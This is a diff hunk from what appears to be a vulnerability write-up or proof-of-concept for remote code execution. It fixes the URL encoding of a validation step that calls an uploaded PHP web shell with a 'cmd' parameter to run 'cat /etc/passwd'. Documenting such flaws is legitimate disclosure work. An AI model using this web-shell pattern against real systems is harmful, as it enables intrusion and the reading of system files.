@@ -387,7 +387,7 @@ Result: The save_img endpoint returned HTTP 200 OK in response to the crafted PO
 
 
 ### 10- Validate 2: Access the created file in link and provide "cat /etc/passwd" command with "cmd" parameter:
-[http://192.168.1.193:8080/export/smithbraz.php?cmd=cat /etc/passwd](http://192.168.1.193:8080/export/smithbraz.php?cmd=cat /etc/passwd)
+[http://192.168.1.193:8080/export/smithbraz.php?cmd=cat+/etc/passwd](http://192.168.1.193:8080/export/smithbraz.php?cmd=cat+/etc/passwd)
 
 ![RCE](./img/10.png)
 
